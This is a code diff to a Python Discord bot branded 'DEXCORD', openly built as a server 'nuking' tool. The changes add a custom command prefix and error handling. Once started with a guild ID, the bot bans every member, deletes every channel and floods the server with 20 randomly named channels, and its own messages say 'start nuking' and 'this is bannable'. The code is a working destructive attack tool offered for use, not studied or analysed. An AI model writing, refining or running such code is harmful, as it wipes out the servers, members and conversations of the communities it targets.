@@ -21,22 +21,25 @@ from colorama import Back, Style, Fore
 intents = discord.Intents.default()
 intents.members = True
 
-client = commands.Bot(command_prefix='!>', intents = intents)
+prefix = input('bot prefix: ')
+print(" ")
+
+client = commands.Bot(command_prefix=f'{prefix}', intents = intents)
 DiscordComponents(client)
 colorama.init()
 
 @client.event
 async def on_ready():
-    print(f"""{Fore.WHITE}
+    print(f"""{Fore.MAGENTA}
 ██████╗ ███████╗██╗  ██╗ ██████╗ ██████╗ ██████╗ ██████╗ 
 ██╔══██╗██╔════╝╚██╗██╔╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
 ██║  ██║█████╗   ╚███╔╝ ██║     ██║   ██║██████╔╝██║  ██║
 ██║  ██║██╔══╝   ██╔██╗ ██║     ██║   ██║██╔══██╗██║  ██║
 ██████╔╝███████╗██╔╝ ██╗╚██████╗╚██████╔╝██║  ██║██████╔╝
 ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
-                                                         
+{Fore.WHITE}                                                       
 """)
-    print(f"{Fore.WHITE}send a message to the bot with !>start GUILD_ID")
+    print(f"message {prefix}start GUILD_ID to start nuking")
 
 
 channelNameList = ["Pvx2L8I9tm3gLfJb4OU2",
@@ -1052,24 +1055,26 @@ async def start(ctx, guild_id:discord.Guild):
         Button(label='Start', style="3", emoji=None, custom_id="startButton1")
     ]])
     interaction = await client.wait_for("button_click",  check = lambda i: i.custom_id == "startButton1")
-    await interaction.send(content = f"check python application for output")
+    await interaction.send(content = f"nuking {guild_id}...")
     print(f"{Fore.RED}[!] {Fore.WHITE}NUKE IS STARTING. this is bannable btw{Fore.WHITE}")
     for i in guild_id.members:
-        try:
-            await guild_id.ban(i)
-            print(f"{Fore.MAGENTA}[*]{Fore.WHITE} Banned {Fore.MAGENTA}{i}")
-        except:
-            print(f"{Fore.RED}[*]{Fore.WHITE} Unable to ban {Fore.RED}{i}")
-            pass
+            try:
+                await guild_id.ban(i)
+                print(f"{Fore.MAGENTA}[*]{Fore.WHITE} Banned {Fore.MAGENTA}{i}{Fore.WHITE}")
+            except:
+                print(f"{Fore.RED}[*]{Fore.WHITE} Unable to ban {Fore.RED}{i}{Fore.WHITE}")
+                pass
     for c in guild_id.channels:
-        await c.delete()
-        print(f"{Fore.MAGENTA}[*]{Fore.WHITE} Removing {Fore.MAGENTA}{c}")
+        try:
+            await c.delete()
+            print(f"{Fore.MAGENTA}[*]{Fore.WHITE} Removing {Fore.MAGENTA}{c}{Fore.WHITE}")
+        except:
+            print(f"{Fore.RED}[*]{Fore.WHITE} Unable to remove {Fore.RED}{c}{Fore.WHITE}")
+            pass
     for i in range(20):
         channelName = random.choice(channelNameList)
         await guild_id.create_text_channel(name='{}'.format(channelName))
-        print(f"{Fore.MAGENTA}[*] {Fore.WHITE}Created channel {Fore.MAGENTA}{channelName}")
-    
-
+        print(f"{Fore.MAGENTA}[*] {Fore.WHITE}Created channel {Fore.MAGENTA}{channelName}{Fore.WHITE}")
 key = token_configuration.TOKEN
 
 client.run(key)
